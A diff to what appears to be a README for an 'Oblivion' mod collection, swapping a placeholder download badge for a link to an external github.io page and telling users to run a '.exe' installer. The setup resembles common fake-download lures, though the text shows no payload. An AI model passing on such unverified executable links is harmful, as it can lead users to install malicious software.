@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` installer – mods will be automatically placed in the game’s **Data** folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://ultimateoblivion-enhancement-collection.github.io/.github/)
 
 ## 📸 Overview
  <img width="3840" height="2160" alt="oblivion-gameplay-improvements" src="https://github.com/user-attachments/assets/9e6d3862-0c51-4a38-9d81-4666351624f5" />
